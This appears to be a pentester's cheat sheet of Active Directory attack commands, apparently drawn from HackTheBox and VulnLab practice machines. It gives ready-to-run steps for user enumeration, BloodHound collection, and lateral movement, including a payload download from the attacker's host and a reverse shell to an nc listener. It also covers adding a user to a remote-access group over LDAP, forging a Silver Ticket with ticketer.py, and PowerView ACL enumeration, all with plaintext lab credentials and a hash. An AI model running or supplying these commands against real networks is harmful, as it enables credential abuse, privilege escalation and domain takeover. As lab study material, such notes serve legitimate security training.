#### enumerate other users remotely
```
nxc smb administrator.htb -u "Olivia" -p "ichliebedich" --rid-brute | grep SidTypeUser
```
or from a shell on the target:
```
net users
```
other tools:
```
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.129.78.4
```

---
#### if creds are valid over smb, but not winrm/rdp, try enum4linux with them:
```
enum4linux -a -u "fmcsorley" -p "CrabSharkJellyfish192" 192.168.199.122
```

---
#### run bloodhound remotely
```
bloodhound-python -c All -dc FOREST.htb.local -gc FOREST.htb.local -ns 10.129.175.196 -d htb.local -u svc-alfresco -p 's3rvice'
```
or use nxc:
```
nxc ldap administrator.htb -u Olivia -p ichliebedich --bloodhound --collection All --dns-tcp --dns-server 10.10.11.42
```
or if creds work with shell, can run SharpHound
```
. .\SharpHound.ps1
```
```
Invoke-BloodHound -CollectionMethod All
```

---
#### want to move laterally and have low level (like svc) creds, but that user is not in Remote Users group (so cant execute commands remotely ie get winrm shell):
- host RunAsCs.exe on python server to upload:
	- `python -m http.server 80`
- set up listener:
	- `rlwrap -cAr nc -lvnp 6969`
- upload RunAsCs.exe to svc level shell:
	- `powershell -c wget 10.10.14.172/RunasCs.exe -outfile r.exe`
- run RunasCs.exe:
```
.\r.exe C.Bum Tikkycoll_431012284 -r 10.10.14.172:6969 cmd
```
- should create new shell in listener as c.bum
	- c.bum:Tikkycoll_431012284 are creds
	- 10.10.14.172 is tun0 on local machine

---
#### if creds are valid, but nxc doesn't show pwned for winrm, run ldeep:
```
ldeep ldap -u tracy.white -p 'zqwj041FGX' -d nara-security.com -s ldap://nara-security.com add_to_group "CN=TRACY WHITE,OU=STAFF,DC=NARA-SECURITY,DC=COM" "CN=REMOTE ACCESS,OU=remote,DC=NARA-SECURITY,DC=COM" && deactivate
```
- adds user to remote access group, so evil-winrm should work afterward
- because of conflicting ldap3 python module with bloodhound, set up ldeep to run in virtual environment with alias so `&& deactivate` just exits that

---
#### ***Silver Ticket***
have low level creds, check for SID(from `enum4linux` or `lookupsid.py`) and ServicePrincipalName (from `GetUserSPNs.py`) of user to make silver ticket
```
GetUserSPNs.py breach.vl/julia.wong:Computer1 -dc-ip 10.10.10.111 -request
```
- returns ntlmv2 hash (crack with `john`) and ServicePrincipalName like `MSSQLSVC/BREACH.VL:1433` used in `ticketer.py` command below:
```
lookupsid.py breach.vl/julia.wong:computer1@10.10.10.10
```
- copy Domain SID for `ticketer.py` command below
- get nthash from ntlm hash generator from password from https://codebeautify.org/ntlm-hash-generator
	- Trustno1 = 69596C7AA1E8DAEE17F8E78870E25A5C
- - make sure `/etc/hosts` reflects IP for Domain `BREACH.VL`
```
ticketer.py -nthash 69596C7AA1E8DAEE17F8E78870E25A5C
-domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl spn 'MSSQLSVC/BREACH.VL:1433@BREACH.VL' -user-id 500 Administrator
```
- will output "saving ticket in Administrator.ccache"
```
export KRB5CCNAME=/home/kali/Desktop/VulnLab/ldap/Administrator.ccache
```
- caches creds
```
mssqlclient.py breach.vl -k -no-pass -windows-auth
```

---
#### PowerView.ps1 (command line alternative to Bloodhound)
```
. .\PowerView.ps1
```
- adds commands to powershell
```
$UsersAcls = Get-DomainObjectAcl -SearchBase "CN=Users,DC=administrator,DC=htb" -ResolveGUIDs
```
- save all user ACLs to variable
```
$UsersAcls | Where-Object { $_.SecurityIdentifier -eq $Olivia.ObjectSID } | Select-Object IdentityReference, ObjectDN, ActiveDirectoryRights | Format-Table -AutoSize
```
- filter $ UsersAcls variable to show rights Olivia has over others
- alternative approach:
To see what rights user (Olivia) has over another user (Michael):
```
$Olivia = Get-ADUser -Identity "olivia" -Properties ObjectSID
```
- saves variable of olivia's SID
```
$MichaelACL = Get-DomainObjectAcl -Identity "CN=Michael Williams,CN=Users,DC=administrator,DC=htb" -ResolveGUIDs
```
- saves Michael's ACL list as a variable
```
$MichaelACL | Where-Object { $_.SecurityIdentifier -eq $Olivia.ObjectSID -and $_.ActiveDirectoryRights -match "GenericAll" } | Select-Object IdentityReference, ActiveDirectoryRights
```
- filters michael's ACL list to show Olivia's rights over him